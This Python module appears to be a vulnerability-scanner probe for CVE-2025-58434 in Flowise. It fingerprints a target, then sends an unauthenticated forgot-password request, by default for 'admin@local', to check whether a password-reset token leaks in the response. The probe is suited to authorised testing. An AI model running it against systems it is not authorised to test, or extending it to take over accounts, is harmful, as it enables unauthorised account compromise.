"""
Raw execution for flowise_token_leak_probe (CVE-2025-58434).
Probes Flowise AI instances for unauthenticated account password reset
token leakage via the /api/v1/account/forgot-password endpoint.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, Dict, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"


@dataclass
class RawFlowiseResult:
    target: str = ""
    base_url: str = ""
    flowise_detected: bool = False
    api_accessible: bool = False
    forgot_password_status: Optional[int] = None
    token_leaked: bool = False
    leaked_token_preview: str = ""
    response_snippet: str = ""
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = f"https://{t}"
    return t.rstrip("/")


def execute(
    target: str,
    email: str = "admin@local",
    host_header: Optional[str] = None,
    timeout: int = 8,
) -> RawFlowiseResult:
    if requests is None:
        return RawFlowiseResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawFlowiseResult(target="", error="target is required")

    base_url = normalize_target_url(target)
    result = RawFlowiseResult(target=target.strip(), base_url=base_url)

    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/plain, */*",
    }
    if host_header and host_header.strip():
        headers["Host"] = host_header.strip()

    session.headers.update(headers)

    # Step 1: Detect Flowise presence via / or /api/v1/ping /api/v1/version
    try:
        r_home = session.get(f"{base_url}/", timeout=timeout, verify=False, allow_redirects=True)
        home_text = r_home.text.lower()
        if "flowise" in home_text or "flowise" in str(r_home.headers).lower():
            result.flowise_detected = True
    except requests.exceptions.RequestException:
        pass

    try:
        r_ping = session.get(f"{base_url}/api/v1/ping", timeout=timeout, verify=False, allow_redirects=False)
        if r_ping.status_code == 200 and ("pong" in r_ping.text.lower() or "flowise" in r_ping.text.lower()):
            result.flowise_detected = True
            result.api_accessible = True
    except requests.exceptions.RequestException:
        pass

    # Step 2: Probe /api/v1/account/forgot-password endpoint
    probe_body = {"user": {"email": email.strip()}}

    try:
        r_forgot = session.post(
            f"{base_url}/api/v1/account/forgot-password",
            json=probe_body,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        result.forgot_password_status = r_forgot.status_code
        resp_text = r_forgot.text or ""
        result.response_snippet = resp_text[:500]

        if r_forgot.status_code in (200, 201):
            result.api_accessible = True
            try:
                data = r_forgot.json()
                user_data = data.get("user", {})
                temp_token = user_data.get("tempToken") or data.get("tempToken")
                if temp_token:
                    result.token_leaked = True
                    result.leaked_token_preview = str(temp_token)[:12] + "..."
            except (ValueError, json.JSONDecodeError, AttributeError):
                if '"tempToken"' in resp_text:
                    result.token_leaked = True
                    result.leaked_token_preview = "token_found_in_body"

        elif r_forgot.status_code in (400, 404, 500):
            # Endpoint might exist and return "Unregistered user" or "User not found"
            if "unregistered user" in resp_text.lower() or "user not found" in resp_text.lower():
                result.api_accessible = True
                result.flowise_detected = True

    except requests.exceptions.RequestException as e:
        if not result.error:
            result.error = f"forgot-password probe failed: {e}"

    return result
